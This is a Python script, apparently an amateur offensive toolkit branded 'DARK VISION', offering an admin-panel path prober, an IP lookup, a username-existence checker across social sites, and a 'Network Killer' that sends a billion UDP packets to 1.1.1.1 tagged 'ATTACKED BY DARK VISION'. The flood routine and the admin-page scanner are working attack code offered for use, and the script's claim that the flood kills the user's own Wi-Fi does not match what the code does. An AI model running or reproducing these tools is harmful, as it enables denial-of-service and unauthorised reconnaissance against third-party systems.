from json import tool
import urllib.request
import smtplib 
import socket 
import time
import os


print("+------------------------------------------------------------------------------------------+")
print("|                                                                                          |")
print("|    /\                                                                                    |")
print("|   /  \                                                                                   |")
print("|  /    \                                                                                  |")
print("|  |----|     1) ADMIN PAGE FINDER     2) WEBSITE BASIC SCAN     3) ACCOUNT OSINT          |")
print("|  |    |                                                                                  |")
print("|  |    |     4) NETWORK KILLER                                                            |")
print("|  |    |                                                                                  |")
print("|  |    |                                                                                  |")
print("|  |    |                                                                                  |")
print("|  |    |                                                                                  |")
print("|  |    |                                                                                  |")
print("|  |____|                                                                                  |")
print("| /      \                                                                                 |")
print("| |      |                                                                                 |")
print("| |      |                                                                                 |")
print("| |      |                                                                                 |")
print("|  (____)                                                                                  |")
print("|                                                                                          |")
print("+------------------------------------------------------------------------------------------+")
Tool_Number=input("| Enter Number: ")
print("+------------------------------------------------------------------------------------------+")
if Tool_Number =='1':
    print("| *WARNING* : Enter Full Url ( https://example.com/ )")
    print("+------------------------------------------------------------------------------------------+")
    Admin_Page_Finder_Url=input("| Enter Url: ")
    print("+------------------------------------------------------------------------------------------+")
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'admin')
        print("| "+Admin_Page_Finder_Url+"admin")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"admin")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'administrator')
        print("| "+Admin_Page_Finder_Url+"administrator")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"administrator")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'phpmyadmin')
        print("| "+Admin_Page_Finder_Url+"phpmyadmin")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"phpmyadmin")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")

    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'myadmin')
        print("| "+Admin_Page_Finder_Url+"myadmin")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"myadmin")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'wp-login')
        print("| "+Admin_Page_Finder_Url+"wp-login")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"wp-login")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'wp-content')
        print("| "+Admin_Page_Finder_Url+"wp-content")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"wp-content")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'cpanel')
        print("| "+Admin_Page_Finder_Url+"cpanel")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"cpanel")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'panel')
        print("| "+Admin_Page_Finder_Url+"panel")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"panel")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'admin.asp')
        print("| "+Admin_Page_Finder_Url+"admin.asp")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"admin.asp")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'administrator.asp')
        print("| "+Admin_Page_Finder_Url+"administrator.asp")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"administrator.asp")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'wp-admin')
        print("| "+Admin_Page_Finder_Url+"wp-admin")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"wp-admin")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'controlpanel')
        print("| "+Admin_Page_Finder_Url+"controlpanel")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"controlpanel")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'editor.php')
        print("| "+Admin_Page_Finder_Url+"editor.php")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"editor.php")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'phpmyadmin.asp')
        print("| "+Admin_Page_Finder_Url+"phpmyadmin.asp")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"phpmyadmin.asp")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
    try:
        urllib.request.urlopen(Admin_Page_Finder_Url+'login/admin.asp')
        print("| "+Admin_Page_Finder_Url+"login/admin.asp")
        print("| "+'CODE : 200')
        print("+------------------------------------------------------------------------------------------+")
        
    except:
        print("| "+Admin_Page_Finder_Url+"login/admin.asp")
        print("| "+'CODE : 404')
        print("+------------------------------------------------------------------------------------------+")
        
if Tool_Number =='2':
    print("| *WARNING* : Enter Short Url ( example.com ) *")
    print("+------------------------------------------------------------------------------------------+")
    url = input('| Enter Url: ')
    print("+------------------------------------------------------------------------------------------+")
    
    if 'http' in url:
        url = url.replace('http://', '')
    elif 'https' in url:
        url = url.replace('https://', '')
    IP = socket.gethostbyname(url)
    try:
        port = socket.getservbyname('http', 'tcp')
    except socket.gaierror:
        port = 80
    print("| "+f'Ip: {IP}')
    print("+------------------------------------------------------------------------------------------+")
    print("| "+f'Port: {port}')
    print("+------------------------------------------------------------------------------------------+")
    
if Tool_Number =='3':
    Account_Username=input("| Enter Username: ")
    print("+------------------------------------------------------------------------------------------+")
    try:
           urllib.request.urlopen('https://www.pinterest.com/'+Account_Username)
           print("| "+"https://www.pinterest.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.pinterest.com/'+Account_Username)
       print("| "+'CODE : 404')
       print
       
    try:
           urllib.request.urlopen('https://www.facebook.com/'+Account_Username)
           print("| "+"https://www.facebook.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.facebook.com/'+Account_Username)
       print("| "+'CODE : 404')
       print("+------------------------------------------------------------------------------------------+")
       
    try:
           urllib.request.urlopen('https://www.vk.com/'+Account_Username)
           print("| "+"https://www.vk.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.vk.com/'+Account_Username)
       print("| "+'CODE : 404')
       print("+------------------------------------------------------------------------------------------+")
       
    try:
           urllib.request.urlopen('https://www.github.com/'+Account_Username)
           print("| "+"https://www.github.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.github.com/'+Account_Username)
       print("| "+'CODE : 404')
       print("+------------------------------------------------------------------------------------------+")
       
    try:
           urllib.request.urlopen('https://www.instagram.com/'+Account_Username)
           print("| "+"https://www.instagram.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.instagram.com/'+Account_Username)
       print("| "+'CODE : 404')
       print("+------------------------------------------------------------------------------------------+")
       
    try:
           urllib.request.urlopen('https://www.youtube.com/'+Account_Username)
           print("| "+"https://www.youtube.com/"+Account_Username)
           print("| "+'CODE : 200')
           print("+------------------------------------------------------------------------------------------+")
        
    except:
       print("| "+'https://www.youtube.com/'+Account_Username)
       print("| "+'CODE : 404')
       print("+------------------------------------------------------------------------------------------+")
       
if Tool_Number =='4':
    print("| *WARNING* : By Using Network Killer You Are Killing Wifi That You Are Connected To  ")
    print("+------------------------------------------------------------------------------------------+")
    Network_Killer_Choice=input("| Do You Want To Start Attack (Y/N) ? : ")
    print("+------------------------------------------------------------------------------------------+")
    if Network_Killer_Choice.upper() == 'Y':
        def send_udp_packet(target_ip, target_port, message):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message.encode(), (target_ip, target_port))
        def main():
            target_ip = "1.1.1.1"
            target_port = 80
            message = "ATTACKED BY DARK VISION"
            print("| Killing Network ... ")
            print("+------------------------------------------------------------------------------------------+")
            for i in range(1000000000):
                send_udp_packet(target_ip, target_port, message)
    
        main()
        
    if Network_Killer_Choice.upper() == 'y':
        def send_udp_packet(target_ip, target_port, message):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message.encode(), (target_ip, target_port))
        def main():
            target_ip = "1.1.1.1"
            target_port = 80
            message = "ATTACKED BY DARK VISION"
            print("| Killing Network ... ")
            print("+------------------------------------------------------------------------------------------+")
            for i in range(1000000000):
                send_udp_packet(target_ip, target_port, message)
    
        main()
        
    if Network_Killer_Choice.upper() == 'YES':
        def send_udp_packet(target_ip, target_port, message):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message.encode(), (target_ip, target_port))
        def main():
            target_ip = "1.1.1.1"
            target_port = 80
            message = "ATTACKED BY DARK VISION"
            print("| Killing Network ... ")
            print("+------------------------------------------------------------------------------------------+")
            for i in range(1000000000):
                send_udp_packet(target_ip, target_port, message)
    
        main()
        
    if Network_Killer_Choice.upper() == 'yes':
        def send_udp_packet(target_ip, target_port, message):
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(message.encode(), (target_ip, target_port))
        def main():
            target_ip = "1.1.1.1"
            target_port = 80
            message = "ATTACKED BY DARK VISION"
            print("| Killing Network ... ")
            print("+------------------------------------------------------------------------------------------+")
            for i in range(1000000000):
                send_udp_packet(target_ip, target_port, message)
    
        main()
        
    if Network_Killer_Choice.upper() == 'N':
        print("| You Stopped Network Killer")
        print("+------------------------------------------------------------------------------------------+")

    if Network_Killer_Choice.upper() == 'n':
        print("+------------------------------------------------------------------------------------------+")
        print("| You Stopped Network Killer")
        
    if Network_Killer_Choice.upper() == 'NO':
        print("| You Stopped Network Killer")
        print("+------------------------------------------------------------------------------------------+")
        
    if Network_Killer_Choice.upper() == 'no':
        print("| You Stopped Network Killer")
        print("+------------------------------------------------------------------------------------------+")
        
